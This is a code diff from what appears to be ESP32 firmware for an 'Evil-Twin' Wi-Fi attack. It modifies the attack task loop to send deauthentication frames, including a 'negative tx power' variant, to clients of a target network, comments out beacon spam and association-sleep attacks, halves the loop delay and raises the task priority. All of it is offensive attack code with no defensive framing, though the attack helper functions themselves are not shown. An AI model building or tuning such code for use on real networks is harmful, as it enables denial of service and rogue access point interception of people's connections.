@@ -10,6 +10,8 @@
 #include "wifi_attacks.h"
 
 
+#define EVIL_TWIN_TASK_PRIO 5
+
 /* Store target information */
 static const char *TAG = "EVIL_TWIN";
 static target_info_t target = { 0 };
@@ -58,16 +60,14 @@ static void evil_twin_task(void *pvParameters)
     while(true)
     {
         /* Spam softAP beacon from STA */
-        wifi_attack_softap_beacon_spam((target_info_t * )&target);
-
+        //wifi_attack_softap_beacon_spam((target_info_t * )&target);
         /* Send deauth to clients */
         wifi_attack_deauth_basic();
         vTaskDelay(pdMS_TO_TICKS(20));
         //wifi_attack_deauth_client_bad_msg1();
-        //wifi_attack_deauth_client_negative_tx_power();
-        wifi_attack_association_sleep();
-
-        vTaskDelay(pdMS_TO_TICKS(200));
+        wifi_attack_deauth_client_negative_tx_power();
+        //wifi_attack_association_sleep();
+        vTaskDelay(pdMS_TO_TICKS(100));
     }
 }
 
@@ -81,7 +81,7 @@ void evil_twin_start_attack(target_info_t *targe_info)
     }
 
     memcpy(&target, targe_info, sizeof(target_info_t));
-    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, 3, &evil_twin_task_handle);
+    xTaskCreate(evil_twin_task, "evil_twin_task", 4096, NULL, EVIL_TWIN_TASK_PRIO, &evil_twin_task_handle);
 
     ESP_LOGI(TAG, "Evil-Twin attack started.");
     ESP_LOGI(TAG, "TARGET: %s on Channel %d.", target.ssid, target.channel);
